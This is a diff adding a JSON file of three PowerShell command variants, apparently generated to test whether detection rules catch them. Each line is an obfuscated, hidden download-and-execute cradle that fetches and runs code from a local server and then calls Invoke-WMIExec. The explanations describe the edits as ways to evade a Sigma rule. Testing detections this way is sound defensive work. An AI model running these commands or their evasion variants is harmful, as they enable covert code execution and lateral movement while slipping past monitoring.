@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=(\\\"http://127.0.0.1:1337/\\\"|%%{(IRM $_)});&(\".SubString.ToString()[67,72,64]-Join\")($u); Import-Module C:\\Lab\\input\\sample.ps1; Invoke-WMIExec\"",
+    "explanation": "Reordering and substitution: Reordered arguments and substituted the suspicious path with a benign lab placeholder to avoid matching the Sigma rule's suspicious indicators."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=(\\\"http://127.0.0.1:1337/\\\"|%%{(IRM $_)});&(\".SubString.ToString()[67,72,64]-Join\")($u); Import-Module C:\\Lab\\input\\sample.ps1; Invoke-WMIExec -dummyArg1 123 -dummyArg2 456\"",
+    "explanation": "Insertion: Inserted dummy arguments after the command to potentially bypass detection by altering the command structure without changing its benign intent."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=(\\\"http://127.0.0.1:1337/\\\"|%%{(IRM $_)});&(\".SubString.ToString()[67,72,64]-Join\")($u); Import-Module C:\\Lab\\input\\sample.ps1; Invoke-WMIExec -Command \"echo LabTest\"",
+    "explanation": "Substitution: Replaced the actual command with a harmless echo command, changing the behavior to avoid matching the Sigma rule's suspicious indicators."
+  }
+]
